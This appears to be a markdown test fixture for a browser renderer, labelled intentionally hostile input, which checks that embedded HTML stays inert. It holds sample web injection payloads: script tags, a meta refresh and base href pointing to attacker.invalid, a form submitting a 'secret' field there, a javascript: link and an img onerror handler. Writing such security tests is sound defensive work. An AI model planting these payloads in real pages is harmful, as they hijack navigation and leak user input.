# Browser security corpus

This file is intentionally hostile test input. It must remain readable without becoming active application DOM.

<script>document.documentElement.dataset.tacoSecurityAttack = 'script'</script>

<meta http-equiv="refresh" content="0;url=https://attacker.invalid/navigate">

<base href="https://attacker.invalid/">

<style>@import url("http://127.0.0.1:4174/attack-style");</style>

<form action="https://attacker.invalid/submit"><input autofocus name="secret"><button>Submit</button></form>

<a href="javascript:document.documentElement.dataset.tacoSecurityAttack='link'">Unsafe link</a>

<img src="http://127.0.0.1:4174/attack-pixel" onerror="document.documentElement.dataset.tacoSecurityAttack='image'">

```html
<script>This fenced source must remain visible and inert.</script>
```
